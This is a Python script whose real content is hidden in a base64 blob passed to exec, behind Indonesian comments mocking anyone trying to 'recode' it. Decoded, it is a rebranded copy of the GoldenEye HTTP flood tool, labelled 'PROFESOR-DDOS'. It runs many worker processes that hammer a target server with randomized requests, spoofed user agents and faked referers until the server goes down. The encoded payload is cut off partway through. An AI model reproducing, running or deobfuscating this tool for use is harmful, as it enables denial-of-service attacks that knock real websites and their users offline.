#Mau ngapain su?
#mau recode?
#awoakawokawok
import base64
exec(base64.b64decode('IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMwoKIiIiCiRJZDogJAoKICAgICAvJCQkJCQkICAgICAgICAgICAgLyQkICAgICAgIC8kJCAgICAgICAgICAgICAgICAgICAgIC8kJCQkJCQkJAogICAgLyQkX18gICQkICAgICAgICAgIHwgJCQgICAgICB8ICQkICAgICAgICAgICAgICAgICAgICB8ICQkX19fX18vCiAgIHwgJCQgIFxfXy8gIC8kJCQkJCQgfCAkJCAgLyQkJCQkJCQgIC8kJCQkJCQgIC8kJCQkJCQkIHwgJCQgICAgICAgLyQkICAgLyQkICAvJCQkJCQkCiAgIHwgJCQgLyQkJCQgLyQkX18gICQkfCAkJCAvJCRfXyAgJCQgLyQkX18gICQkfCAkJF9fICAkJHwgJCQkJCQgICB8ICQkICB8ICQkIC8kJF9fICAkJAogICB8ICQkfF8gICQkfCAkJCAgXCAkJHwgJCR8ICQkICB8ICQkfCAkJCQkJCQkJHwgJCQgIFwgJCR8ICQkX18vICAgfCAkJCAgfCAkJHwgJCQkJCQkJCQKICAgfCAkJCAgXCAkJHwgJCQgIHwgJCR8ICQkfCAkJCAgfCAkJHwgJCRfX19fXy98ICQkICB8ICQkfCAkJCAgICAgIHwgJCQgIHwgJCR8ICQkX19fX18vCiAgIHwgICQkJCQkJC98ICAkJCQkJCQvfCAkJHwgICQkJCQkJCR8ICAkJCQkJCQkfCAkJCAgfCAkJHwgJCQkJCQkJCR8ICAkJCQkJCQkfCAgJCQkJCQkJAogICAgXF9fX19fXy8gIFxfX19fX18vIHxfXy8gXF9fX19fX18vIFxfX19fX19fL3xfXy8gIHxfXy98X19fX19fX18vIFxfX19fICAkJCBcX19fX19fXy8KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLyQkICB8ICQkCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfCAgJCQkJCQkLwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcX19fX19fLwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBST0ZFU09SLURET1MgViAyLjEKClRoaXMgdG9vbCBpcyBhIGRvcyB0b29sIHRoYXQgaXMgbWVhbnQgdG8gcHV0IGhlYXZ5IGxvYWQgb24gSFRUUCBzZXJ2ZXJzCmluIG9yZGVyIHRvIGJyaW5nIHRoZW0gdG8gdGhlaXIga25lZXMgYnkgZXhoYXVzdGluZyB0aGUgcmVzb3VyY2UgcG9vbC4KClRoaXMgdG9vbCBpcyBtZWFudCBmb3IgcmVzZWFyY2ggcHVycG9zZXMgb25seQphbmQgYW55IG1hbGljaW91cyB1c2FnZSBvZiB0aGlzIHRvb2wgaXMgcHJvaGliaXRlZC4KCkBhdXRob3IgUHJvZmVzb3IgRERPUyA8aHR0cDovL3dyb290Lm9yZy8+CgpAZGF0ZSAyMDIxLTIyLTA2CkB2ZXJzaW9uIDIuMQoKQFRPRE8gVGVzdCBpbiBweXRob24gMy54CgpMSUNFTlNFOgpUaGlzIHNvZnR3YXJlIGlzIGRpc3RyaWJ1dGVkIHVuZGVyIHRoZSBHTlUgR2VuZXJhbCBQdWJsaWMgTGljZW5zZSB2ZXJzaW9uIDMgKEdQTHYzKQoKTEVHQUwgTk9USUNFOgpUSElTIFNPRlRXQVJFIElTIFBST1ZJREVEIEZPUiBFRFVDQVRJT05BTCBVU0UgT05MWSEKSUYgWU9VIEVOR0FHRSBJTiBBTlkgSUxMRUdBTCBBQ1RJVklUWQpUSEUgQVVUSE9SIERPRVMgTk9UIFRBS0UgQU5ZIFJFU1BPTlNJQklMSVRZIEZPUiBJVC4KQlkgVVNJTkcgVEhJUyBTT0ZUV0FSRSBZT1UgQUdSRUUgV0lUSCBUSEVTRSBURVJNUy4KIiIiCgpmcm9tIG11bHRpcHJvY2Vzc2luZyBpbXBvcnQgUHJvY2VzcywgTWFuYWdlciwgUG9vbAppbXBvcnQgdXJsbGliLnBhcnNlLCBzc2wKaW1wb3J0IHN5cywgZ2V0b3B0LCByYW5kb20sIHRpbWUsIG9zCmltcG9ydCBodHRwLmNsaWVudApIVFRQQ0xJRU5UID0gaHR0cC5jbGllbnQKCiMjIyMKIyBDb25maWcKIyMjIwpERUJVRyA9IEZhbHNlClNTTFZFUklGWSA9IFRydWUKCiMjIyMKIyBDb25zdGFudHMKIyMjIwpNRVRIT0RfR0VUID0gJ2dldCcKTUVUSE9EX1BPU1QgPSAncG9zdCcKTUVUSE9EX1JBTkQgPSAncmFuZG9tJwoKSk9JTl9USU1FT1VUID0gMS4wCgpERUZBVUxUX1dPUktFUlMgPSAxMApERUZBVUxUX1NPQ0tFVFMgPSA1MDAKCkdPTERFTkVZRV9CQU5ORVIgPSAnR29sZGVuRXllIHYyLjEgYnkgUHJvZkFjYyA8WVQ6UHJvZmVzb3IgQWNjPicKClVTRVJfQUdFTlRfUEFSVFMgPSB7CiAgICAnb3MnOiB7CiAgICAgICAgJ2xpbnV4JzogewogICAgICAgICAgICAnbmFtZSc6IFsnTGludXggeDg2XzY0JywgJ0xpbnV4IGkzODYnXSwKICAgICAgICAgICAgJ2V4dCc6IFsnWDExJ10KICAgICAgICB9LAogICAgICAgICd3aW5kb3dzJzogewogICAgICAgICAgICAnbmFtZSc6IFsnV2luZG93cyBOVCA2LjEnLCAnV2luZG93cyBOVCA2LjMnLCAnV2luZG93cyBOVCA1LjEnLCAnV2luZG93cyBOVC42LjInXSwKICAgICAgICAgICAgJ2V4dCc6IFsnV09XNjQnLCAnV2luNjQ7IHg2NCddCiAgICAgICAgfSwKICAgICAgICAnbWFjJzogewogICAgICAgICAgICAnbmFtZSc6IFsnTWFjaW50b3NoJ10sCiAgICAgICAgICAgICdleHQnOiBbJ0ludGVsIE1hYyBPUyBYICVkXyVkXyVkJyAlIChyYW5kb20ucmFuZGludCgxMCwgMTEpLCByYW5kb20ucmFuZGludCgwLCA5KSwgcmFuZG9tLnJhbmRpbnQoMCwgNSkpIGZvciBpIGluIHJhbmdlKDEsIDEwKV0KICAgICAgICB9LAogICAgfSwKICAgICdwbGF0Zm9ybSc6IHsKICAgICAgICAnd2Via2l0JzogewogICAgICAgICAgICAnbmFtZSc6IFsnQXBwbGVXZWJLaXQvJWQuJWQnICUgKHJhbmRvbS5yYW5kaW50KDUzNSwgNTM3KSwgcmFuZG9tLnJhbmRpbnQoMSwzNikpIGZvciBpIGluIHJhbmdlKDEsIDMwKV0sCiAgICAgICAgICAgICdkZXRhaWxzJzogWydLSFRNTCwgbGlrZSBHZWNrbyddLAogICAgICAgICAgICAnZXh0ZW5zaW9ucyc6IFsnQ2hyb21lLyVkLjAuJWQuJWQgU2FmYXJpLyVkLiVkJyAlIChyYW5kb20ucmFuZGludCg2LCAzMiksIHJhbmRvbS5yYW5kaW50KDEwMCwgMjAwMCksIHJhbmRvbS5yYW5kaW50KDAsIDEwMCksIHJhbmRvbS5yYW5kaW50KDUzNSwgNTM3KSwgcmFuZG9tLnJhbmRpbnQoMSwgMzYpKSBmb3IgaSBpbiByYW5nZSgxLCAzMCkgXSArIFsgJ1ZlcnNpb24vJWQuJWQuJWQgU2FmYXJpLyVkLiVkJyAlIChyYW5kb20ucmFuZGludCg0LCA2KSwgcmFuZG9tLnJhbmRpbnQoMCwgMSksIHJhbmRvbS5yYW5kaW50KDAsIDkpLCByYW5kb20ucmFuZGludCg1MzUsIDUzNyksIHJhbmRvbS5yYW5kaW50KDEsIDM2KSkgZm9yIGkgaW4gcmFuZ2UoMSwgMTApXQogICAgICAgIH0sCiAgICAgICAgJ2lleHBsb3Jlcic6IHsKICAgICAgICAgICAgJ2Jyb3dzZXJfaW5mbyc6IHsKICAgICAgICAgICAgICAgICduYW1lJzogWydNU0lFIDYuMCcsICdNU0lFIDYuMScsICdNU0lFIDcuMCcsICdNU0lFIDcuMGInLCAnTVNJRSA4LjAnLCAnTVNJRSA5LjAnLCAnTVNJRSAxMC4wJ10sCiAgICAgICAgICAgICAgICAnZXh0X3ByZSc6IFsnY29tcGF0aWJsZScsICdXaW5kb3dzOyBVJ10sCiAgICAgICAgICAgICAgICAnZXh0X3Bvc3QnOiBbJ1RyaWRlbnQvJWQuMCcgJSBpIGZvciBpIGluIHJhbmdlKDQsIDYpIF0gKyBbICcuTkVUIENMUiAlZC4lZC4lZCcgJSAocmFuZG9tLnJhbmRpbnQoMSwgMyksIHJhbmRvbS5yYW5kaW50KDAsIDUpLCByYW5kb20ucmFuZGludCgxMDAwLCAzMDAwMCkpIGZvciBpIGluIHJhbmdlKDEsIDEwKV0KICAgICAgICAgICAgfQogICAgICAgIH0sCiAgICAgICAgJ2dlY2tvJzogewogICAgICAgICAgICAnbmFtZSc6IFsnR2Vja28vJWQlMDJkJTAyZCBGaXJlZm94LyVkLjAnICUgKHJhbmRvbS5yYW5kaW50KDIwMDEsIDIwMTApLCByYW5kb20ucmFuZGludCgxLDMxKSwgcmFuZG9tLnJhbmRpbnQoMSwxMikgLCByYW5kb20ucmFuZGludCgxMCwgMjUpKSBmb3IgaSBpbiByYW5nZSgxLCAzMCldLAogICAgICAgICAgICAnZGV0YWlscyc6IFtdLAogICAgICAgICAgICAnZXh0ZW5zaW9ucyc6IFtdCiAgICAgICAgfQogICAgfQp9CgojIyMjCiMgR29sZGVuRXllIENsYXNzCiMjIyMKCmNsYXNzIEdvbGRlbkV5ZShvYmplY3QpOgoKICAgICMgQ291bnRlcnMKICAgIGNvdW50ZXIgPSBbMCwgMF0KICAgIGxhc3RfY291bnRlciA9IFswLCAwXQoKICAgICMgQ29udGFpbmVycwogICAgd29ya2Vyc1F1ZXVlID0gW10KICAgIG1hbmFnZXIgPSBOb25lCiAgICB1c2VyYWdlbnRzID0gW10KCiAgICAjIFByb3BlcnRpZXMKICAgIHVybCA9IE5vbmUKCiAgICAjIE9wdGlvbnMKICAgIG5yX3dvcmtlcnMgPSBERUZBVUxUX1dPUktFUlMKICAgIG5yX3NvY2tldHMgPSBERUZBVUxUX1NPQ0tFVFMKICAgIG1ldGhvZCA9IE1FVEhPRF9HRVQKCiAgICBkZWYgX19pbml0X18oc2VsZiwgdXJsKToKCiAgICAgICAgIyBTZXQgVVJMCiAgICAgICAgc2VsZi51cmwgPSB1cmwKCiAgICAgICAgIyBJbml0aWFsaXplIE1hbmFnZXIKICAgICAgICBzZWxmLm1hbmFnZXIgPSBNYW5hZ2VyKCkKCiAgICAgICAgIyBJbml0aWFsaXplIENvdW50ZXJzCiAgICAgICAgc2VsZi5jb3VudGVyID0gc2VsZi5tYW5hZ2VyLmxpc3QoKDAsIDApKQoKCiAgICBkZWYgZXhpdChzZWxmKToKICAgICAgICBzZWxmLnN0YXRzKCkKICAgICAgICBwcmludCgiU2h1dHRpbmcgZG93biBHb2xkZW5FeWUiKQoKICAgIGRlZiBfX2RlbF9fKHNlbGYpOgogICAgICAgIHNlbGYuZXhpdCgpCgogICAgZGVmIHByaW50SGVhZGVyKHNlbGYpOgoKICAgICAgICAjIFRhdW50IQogICAgICAgIHByaW50KCkKICAgICAgICBwcmludChHT0xERU5FWUVfQkFOTkVSKQogICAgICAgIHByaW50KCkKCiAgICAjIERvIHRoZSBmdW4hCiAgICBkZWYgZmlyZShzZWxmKToKCiAgICAgICAgc2VsZi5wcmludEhlYWRlcigpCiAgICAgICAgcHJpbnQoIkhpdHRpbmcgd2Vic2VydmVyIGluIG1vZGUgJ3swfScgd2l0aCB7MX0gd29ya2VycyBydW5uaW5nIHsyfSBjb25uZWN0aW9ucyBlYWNoLiBIaXQgQ1RSTCtDIHRvIGNhbmNlbC4iLmZvcm1hdChzZWxmLm1ldGhvZCwgc2VsZi5ucl93b3JrZXJzLCBzZWxmLm5yX3NvY2tldHMpKQoKICAgICAgICBpZiBERUJVRzoKICAgICAgICAgICAgcHJpbnQoIlN0YXJ0aW5nIHswfSBjb25jdXJyZW50IHdvcmtlcnMiLmZvcm1hdChzZWxmLm5yX3dvcmtlcnMpKQoKICAgICAgICAjIFN0YXJ0IHdvcmtlcnMKICAgICAgICBmb3IgaSBpbiByYW5nZShpbnQoc2VsZi5ucl93b3JrZXJzKSk6CgogICAgICAgICAgICB0cnk6CgogICAgICAgICAgICAgICAgd29ya2VyID0gU3RyaWtlcihzZWxmLnVybCwgc2VsZi5ucl9zb2NrZXRzLCBzZWxmLmNvdW50ZXIpCiAgICAgICAgICAgICAgICB3b3JrZXIudXNlcmFnZW50cyA9IHNlbGYudXNlcmFnZW50cwogICAgICAgICAgICAgICAgd29ya2VyLm1ldGhvZCA9IHNlbGYubWV0aG9kCgogICAgICAgICAgICAgICAgc2VsZi53b3JrZXJzUXVldWUuYXBwZW5kKHdvcmtlcikKICAgICAgICAgICAgICAgIHdvcmtlci5zdGFydCgpCiAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgICAgICBlcnJvcigiRmFpbGVkIHRvIHN0YXJ0IHdvcmtlciB7MH0iLmZvcm1hdChpKSkKICAgICAgICAgICAgICAgIHBhc3MKCiAgICAgICAgaWYgREVCVUc6CiAgICAgICAgICAgIHByaW50KCJJbml0aWF0aW5nIG1vbml0b3IiKQogICAgICAgIHNlbGYubW9uaXRvcigpCgogICAgZGVmIHN0YXRzKHNlbGYpOgoKICAgICAgICB0cnk6CiAgICAgICAgICAgIGlmIHNlbGYuY291bnRlclswXSA+IDAgb3Igc2VsZi5jb3VudGVyWzFdID4gMDoKCiAgICAgICAgICAgICAgICBwcmludCgiezB9IEdvbGRlbkV5ZSBzdHJpa2VzIGhpdC4gKHsxfSBGYWlsZWQpIi5mb3JtYXQoc2VsZi5jb3VudGVyWzBdLCBzZWxmLmNvdW50ZXJbMV0pKQoKICAgICAgICAgICAgICAgIGlmIHNlbGYuY291bnRlclswXSA+IDAgYW5kIHNlbGYuY291bnRlclsxXSA+IDAgYW5kIHNlbGYubGFzdF9jb3VudGVyWzBdID09IHNlbGYuY291bnRlclswXSBhbmQgc2VsZi5jb3VudGVyWzFdID4gc2VsZi5sYXN0X2NvdW50ZXJbMV06CiAgICAgICAgICAgICAgICAgICAgcHJpbnQoIlx0U2VydmVyIG1heSBiZSBET1dOISIpCgogICAgICAgICAgICAgICAgc2VsZi5sYXN0X2NvdW50ZXJbMF0gPSBzZWxmLmNvdW50ZXJbMF0KICAgICAgICAgICAgICAgIHNlbGYubGFzdF9jb3VudGVyWzFdID0gc2VsZi5jb3VudGVyWzFdCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICAgICAgcGFzcyAjIHNpbGVudGx5IGlnbm9yZQoKICAgIGRlZiBtb25pdG9yKHNlbGYpOgogICAgICAgIHdoaWxlIGxlbihzZWxmLndvcmtlcnNRdWV1ZSkgPiAwOgogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBmb3Igd29ya2VyIGluIHNlbGYud29ya2Vyc1F1ZXVlOgogICAgICAgICAgICAgICAgICAgIGlmIHdvcmtlciBpcyBub3QgTm9uZSBhbmQgd29ya2VyLmlzX2FsaXZlKCk6CiAgICAgICAgICAgICAgICAgICAgICAgIHdvcmtlci5qb2luKEpPSU5fVElNRU9VVCkKICAgICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICBzZWxmLndvcmtlcnNRdWV1ZS5yZW1vdmUod29ya2VyKQoKICAgICAgICAgICAgICAgIHNlbGYuc3RhdHMoKQoKICAgICAgICAgICAgZXhjZXB0IChLZXlib2FyZEludGVycnVwdCwgU3lzdGVtRXhpdCk6CiAgICAgICAgICAgICAgICBwcmludCgiQ1RSTCtDIHJlY2VpdmVkLiBLaWxsaW5nIGFsbCB3b3JrZXJzIikKICAgICAgICAgICAgICAgIGZvciB3b3JrZXIgaW4gc2VsZi53b3JrZXJzUXVldWU6CiAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICBpZiBERUJVRzoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCJLaWxsaW5nIHdvcmtlciB7MH0iLmZvcm1hdCh3b3JrZXIubmFtZSkpCiAgICAgICAgICAgICAgICAgICAgICAgICN3b3JrZXIudGVybWluYXRlKCkKICAgICAgICAgICAgICAgICAgICAgICAgd29ya2VyLnN0b3AoKQogICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MgIyBzaWxlbnRseSBpZ25vcmUKICAgICAgICAgICAgICAgIGlmIERFQlVHOgogICAgICAgICAgICAgICAgICAgIHJhaXNlCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIHBhc3MKCiMjIyMKIyBTdHJpa2VyIENsYXNzCiMjIyMKCmNsYXNzIFN0cmlrZXIoUHJvY2Vzcyk6CgoKICAgICMgQ291bnRlcnMKICAgIHJlcXVlc3RfY291bnQgPSAwCiAgICBmYWlsZWRfY291bnQgPSAwCgogICAgIyBDb250YWluZXJzCiAgICB1cmwgPSBOb25lCiAgICBob3N0ID0gTm9uZQogICAgcG9ydCA9IDgwCiAgICBzc2wgPSBGYWxzZQogICAgcmVmZXJlcnMgPSBbXQogICAgdXNlcmFnZW50cyA9IFtdCiAgICBzb2NrcyA9IFtdCiAgICBjb3VudGVyID0gTm9uZQogICAgbnJfc29ja3MgPSBERUZBVUxUX1NPQ0tFVFMKCiAgICAjIEZsYWdzCiAgICBydW5uYWJsZSA9IFRydWUKCiAgICAjIE9wdGlvbnMKICAgIG1ldGhvZCA9IE1FVEhPRF9HRVQKCiAgICBkZWYgX19pbml0X18oc2VsZiwgdXJsLCBucl9zb2NrZXRzLCBjb3VudGVyKToKCiAgICAgICAgc3VwZXIoU3RyaWtlciwgc2VsZikuX19pbml0X18oKQoKICAgICAgICBzZWxmLmNvdW50ZXIgPSBjb3VudGVyCiAgICAgICAgc2VsZi5ucl9zb2NrcyA9IG5yX3NvY2tldHMKCiAgICAgICAgcGFyc2VkVXJsID0gdXJsbGliLnBhcnNlLnVybHBhcnNlKHVybCkKCiAgICAgICAgaWYgcGFyc2VkVXJsLnNjaGVtZSA9PSAnaHR0cHMnOgogICAgICAgICAgICBzZWxmLnNzbCA9IFRydWUKCiAgICAgICAgc2VsZi5ob3N0ID0gcGFyc2VkVXJsLm5ldGxvYy5zcGxpdCgnOicpWzBdCiAgICAgICAgc2VsZi51cmwgPSBwYXJzZWRVcmwucGF0aAoKICAgICAgICBzZWxmLnBvcnQgPSBwYXJzZWRVcmwucG9ydAoKICAgICAgICBpZiBub3Qgc2VsZi5wb3J0OgogICAgICAgICAgICBzZWxmLnBvcnQgPSA4MCBpZiBub3Qgc2VsZi5zc2wgZWxzZSA0NDMKCgogICAgICAgIHNlbGYucmVmZXJlcnMgPSBbCiAgICAgICAgICAgICdodHRwOi8vd3d3Lmdvb2dsZS5jb20vJywKICAgICAgICAgICAgJ2h0dHA6Ly93d3cuYmluZy5jb20vJywKICAgICAgICAgICAgJ2h0dHA6Ly93d3cuYmFpZHUuY29tLycsCiAgICAgICAgICAgICdodHRwOi8vd3d3LnlhbmRleC5jb20vJywKICAgICAgICAgICAgJ2h0dHA6Ly8nICsgc2VsZi5ob3N0ICsgJy8nCiAgICAgICAgICAgIF0KCgogICAgZGVmIF9fZGVsX18oc2VsZik6CiAgICAgICAgc2VsZi5zdG9wKCkKCgogICAgI2J1aWxkcyByYW5kb20gYXNjaWkgc3RyaW5nCiAgICBkZWYgYnVpbGRibG9jayhzZWxmLCBzaXplKToKICAgICAgICBvdXRfc3RyID0gJycKCiAgICAgICAgX0xPV0VSQ0FTRSA9IGxpc3QocmFuZ2UoOTcsIDEyMikpCiAgICAgICAgX1VQUEVSQ0FTRSA9IGxpc3QocmFuZ2UoNjUsIDkwKSkKICAgICAgICBfTlVNRVJJQyAgID0gbGlzdChyYW5nZSg0OCwgNTcpKQoKICAgICAgICB2YWxpZENoYXJzID0gX0xPV0VSQ0FTRSArIF9VUFBFUkNBU0UgKyBfTlVNRVJJQwoKICAgICAgICBmb3IgaSBpbiByYW5nZSgwLCBzaXplKToKICAgICAgICAgICAgYSA9IHJhbmRvbS5jaG9pY2UodmFsaWRDaGFycykKICAgICAgICAgICAgb3V0X3N0ciArPSBjaHIoYSkKCiAgICAgICAgcmV0dXJuIG91dF9zdHIKCgogICAgZGVmIHJ1bihzZWxmKToKCiAgICAgICAgaWYgREVCVUc6CiAgICAgICAgICAgIHByaW50KCJTdGFydGluZyB3b3JrZXIgezB9Ii5mb3JtYXQoc2VsZi5uYW1lKSkKCiAgICAgICAgd2hpbGUgc2VsZi5ydW5uYWJsZToKCiAgICAgICAgICAgIHRyeToKCiAgICAgICAgICAgICAgICBmb3IgaSBpbiByYW5nZShzZWxmLm5yX3NvY2tzKToKCiAgICAgICAgICAgICAgICAgICAgaWYgc2VsZi5zc2w6CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIFNTTFZFUklGWToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGMgPSBIVFRQQ0xJRU5ULkhUVFBTQ29ubmVjdGlvbihzZWxmLmhvc3QsIHNlbGYucG9ydCkKICAgICAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGMgPSBIVFRQQ0xJRU5ULkhUVFBTQ29ubmVjdGlvbihzZWxmLmhvc3QsIHNlbGYucG9ydCwgY29udGV4dD1zc2wuX2NyZWF0ZV91bnZlcmlmaWVkX2NvbnRleHQoKSkKICAgICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICBjID0gSFRUUENMSUVOVC5IVFRQQ29ubmVjdGlvbihzZWxmLmhvc3QsIHNlbGYucG9ydCkKCiAgICAgICAgICAgICAgICAgICAgc2VsZi5zb2Nrcy5hcHBlbmQoYykKCiAgICAgICAgICAgICAgICBmb3IgY29ubl9yZXEgaW4gc2VsZi5zb2NrczoKCiAgICAgICAgICAgICAgICAgICAgKHVybCwgaGVhZGVycykgPSBzZWxmLmNyZWF0ZVBheWxvYWQoKQoKICAgICAgICAgICAgICAgICAgICBtZXRob2QgPSByYW5kb20uY2hvaWNlKFtNRVRIT0RfR0VULCBNRVRIT0RfUE9TVF0pIGlmIHNlbGYubWV0aG9kID09IE1FVEhPRF9SQU5EIGVsc2Ugc2VsZi5tZXRob2QKCiAgICAgICAgICAgICAgICAgICAgY29ubl9yZXEucmVxdWVzdChtZXRob2QudXBwZXIoKSwgdXJsLCBOb25lLCBoZWFkZXJzKQoKICAgICAgICAgICAgICAgIGZvciBjb25uX3Jlc3AgaW4gc2VsZi5zb2NrczoKCiAgICAgICAgICAgICAgICAgICAgcmVzcCA9IGNvbm5fcmVzcC5nZXRyZXNwb25zZSgpCiAgICAgICAgICAgICAgICAgICAgc2VsZi5pbmNDb3VudGVyKCkKCiAgICAgICAgICAgICAgICBzZWxmLmNsb3NlQ29ubmVjdGlvbnMoKQoKICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgc2VsZi5pbmNGYWlsZWQoKQogICAgICAgICAgICAgICAgaWYgREVCVUc6CiAgICAgICAgICAgICAgICAgICAgcmFpc2UKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgcGFzcyAjIHNpbGVudGx5IGlnbm9yZQoKICAgICAgICBpZiBERUJVRzoKICAgICAgICAgICAgcHJpbnQoIldvcmtlciB7MH0gY29tcGxldGVkIHJ1bi4gU2xlZXBpbmcuLi4iLmZvcm1hdChzZWxmLm5hbWUpKQoKICAgIGRlZiBjbG9zZUNvbm5lY3Rpb25zKHNlbGYpOgogICAgICAgIGZvciBjb25uIGluIHNlbGYuc29ja3M6CiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIGNvbm4uY2xvc2UoKQogICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBwYXNzICMgc2lsZW50bHkgaWdub3JlCgoKICAgIGRlZiBjcmVhdGVQYXlsb2FkKHNlbGYpOgoKICAgICAgICByZXFfdXJsLCBoZWFkZXJzID0gc2VsZi5nZW5lcmF0ZURhdGEoKQoKICAgICAgICByYW5kb21fa2V5cyA9IGxpc3QoaGVhZGVycy5rZXlzKCkpCiAgICAgICAgcmFuZG9tLnNodWZmbGUocmFuZG9tX2tleXMpCiAgICAgICAgcmFuZG9tX2hlYWRlcnMgPSB7fQoKICAgICAgICBmb3IgaGVhZGVyX25hbWUgaW4gcmFuZG9tX2tleXM6CiAgICAgICAgICAgIHJhbmRvbV9oZWFkZXJzW2hlYWRlcl9uYW1lXSA9IGhlYWRlcnNbaGVhZGVyX25hbWVdCgogICAgICAgIHJldHVybiAocmVxX3VybCwgcmFuZG9tX2hlYWRlcnMpCgogICAgZGVmIGdlbmVyYXRlUXVlcnlTdHJpbmcoc2VsZiwgYW1tb3VudCA9IDEpOgoKICAgICAgICBxdWVyeVN0cmluZyA9IFtdCgogICAgICAgIGZvciBpIGluIHJhbmdlKGFtbW91bnQpOgoKICAgICAgICAgICAga2V5ID0gc2VsZi5idWlsZGJsb2NrKHJhbmRvbS5yYW5kaW50KDMsMTApKQogICAgICAgICAgICB2YWx1ZSA9IHNlbGYuYnVpbGRibG9jayhyYW5kb20ucmFuZGludCgzLDIwKSkKICAgICAgICAgICAgZWxlbWVudCA9ICJ7MH09ezF9Ii5mb3JtYXQoa2V5LCB2YWx1ZSkKICAgICAgICAgICAgcXVlcnlTdHJpbmcuYXBwZW5kKGVsZW1lbnQpCgogICAgICAgIHJldHVybiAnJicuam9pbihxdWVyeVN0cmluZykKCgogICAgZGVmIGdlbmVyYXRlRGF0YShzZWxmKToKCiAgICAgICAgcmV0dXJuQ29kZSA9IDAKICAgICAgICBwYXJhbV9qb2luZXIgPSAiPyIKCiAgICAgICAgaWYgbGVuKHNlbGYudXJsKSA9PSAwOgogICAgICAgICAgICBzZWxmLnVybCA9ICcvJwoKICAgICAgICBpZiBzZWxmLnVybC5jb3VudCgiPyIpID4gMDoKICAgICAgICAgICAgcGFyYW1fam9pbmVyID0gIiYiCgogICAgICAgIHJlcXVlc3RfdXJsID0gc2VsZi5nZW5lcmF0ZVJlcXVlc3RVcmwocGFyYW1fam9pbmVyKQoKICAgICAgICBodHRwX2hlYWRlcnMgPSBzZWxmLmdlbmVyYXRlUmFuZG9tSGVhZGVycygpCgoKICAgICAgICByZXR1cm4gKHJlcXVlc3RfdXJsLCBodHRwX2hlYWRlcnMpCgogICAgZGVmIGdlbmVyYXRlUmVxdWVzdFVybChzZWxmLCBwYXJhbV9qb2luZXIgPSAnPycpOgoKICAgICAgICByZXR1cm4gc2VsZi51cmwgKyBwYXJhbV9qb2luZXIgKyBzZWxmLmdlbmVyYXRlUXVlcnlTdHJpbmcocmFuZG9tLnJhbmRpbnQoMSw1KSkKCiAgICBkZWYgZ2V0VXNlckFnZW50KHNlbGYpOgoKICAgICAgICBpZiBzZWxmLnVzZXJhZ2VudHM6CiAgICAgICAgICAgIHJldHVybiByYW5kb20uY2hvaWNlKHNlbGYudXNlcmFnZW50cykKCiAgICAgICAgIyBNb3ppbGxhL1t2ZXJzaW9uXSAoW3N5c3RlbSBhbmQgYnJvd3NlciBpbmZvcm1hdGlvbl0pIFtwbGF0Zm9ybV0gKFtwbGF0Zm9ybSBkZXRhaWxzXSkgW2V4dGVuc2lvbnNdCgogICAgICAgICMjIE1vemlsbGEgVmVyc2lvbgogICAgICAgIG1vemlsbGFfdmVyc2lvbiA9ICJNb3ppbGxhLzUuMCIgIyBoYXJkY29kZWQgZm9yIG5vdywgYWxtb3N0IGV2ZXJ5IGJyb3dzZXIgaXMgb24gdGhpcyB2ZXJzaW9uIGV4Y2VwdCBJRTYKCiAgICAgICAgIyMgU3lzdGVtIEFuZCBCcm93c2VyIEluZm9ybWF0aW9uCiAgICAgICAgIyBDaG9vc2UgcmFuZG9tIE9TCiAgICAgICAgb3MgPSBVU0VSX0FHRU5UX1BBUlRTWydvcyddW3JhbmRvbS5jaG9pY2UobGlzdChVU0VSX0FHRU5UX1BBUlRTWydvcyddLmtleXMoKSkpXQogICAgICAgIG9zX25hbWUgPSByYW5kb20uY2hvaWNlKG9zWyduYW1lJ10pCiAgICAgICAgc3lzaW5mbyA9IG9zX25hbWUKCiAgICAgICAgIyBDaG9vc2UgcmFuZG9tIHBsYXRmb3JtCiAgICAgICAgcGxhdGZvcm0gPSBVU0VSX0FHRU5UX1BBUlRTWydwbGF0Zm9ybSddW3JhbmRvbS5jaG9pY2UobGlzdChVU0VSX0FHRU5UX1BBUlRTWydwbGF0Zm9ybSddLmtleXMoKSkpXQoKICAgICAgICAjIEdldCBCcm93c2VyIEluZm9ybWF0aW9uIGlmIGF2YWlsYWJsZQogICAgICAgIGlmICdicm93c2VyX2luZm8nIGluIHBsYXRmb3JtIGFuZCBwbGF0Zm9ybVsnYnJvd3Nlcl9pbmZvJ106CiAgICAgICAgICAgIGJyb3dzZXIgPSBwbGF0Zm9ybVsnYnJvd3Nlcl9pbmZvJ10KCiAgICAgICAgICAgIGJyb3dzZXJfc3RyaW5nID0gcmFuZG9tLmNob2ljZShicm93c2VyWyduYW1lJ10pCgogICAgICAgICAgICBpZiAnZXh0X3ByZScgaW4gYnJvd3NlcjoKICAgICAgICAgICAgICAgIGJyb3dzZXJfc3RyaW5nID0gIiVzOyAlcyIgJSAocmFuZG9tLmNob2ljZShicm93c2VyWydleHR